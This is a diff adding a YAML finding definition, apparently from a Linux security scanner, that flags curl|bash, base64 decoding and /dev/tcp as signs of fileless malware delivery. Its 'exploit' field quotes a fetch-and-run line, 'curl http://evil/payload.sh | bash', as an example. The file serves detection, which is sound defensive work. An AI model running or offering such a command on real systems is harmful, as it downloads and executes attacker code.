@@ -1,0 +1,28 @@
+id: COM-205
+title: Suspicious Command Line Patterns
+threat: Command lines containing curl|bash, base64 decoding, or dev/tcp indicate malware delivery or backdoor execution.
+exploit: "An attacker runs: 'curl http://evil/payload.sh | bash' to download and execute a script without writing to disk (fileless execution)."
+impact: Fileless malware execution, backdoor deployment, credential theft.
+fix: "Kill the process and investigate the source of the payload."
+breakage: "Some administrative scripts may use similar patterns legitimately."
+cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)"
+affected_versions:
+  - "Ubuntu 20.04"
+  - "Ubuntu 22.04"
+  - "Ubuntu 24.04"
+false_positive_rate: 0.15
+known_exceptions:
+  - "DevOps automation scripts using curl|bash for installation"
+  - "Official installer scripts from NodeSource, Rustup, etc."
+related_findings:
+  - "COM-201"
+  - "COM-206"
+severity_override: null
+tags:
+  - "compromise"
+  - "malware"
+  - "incident-response"
+  - "fileless"
+mitre_mappings:
+  - "T1059"
+  - "T1204"
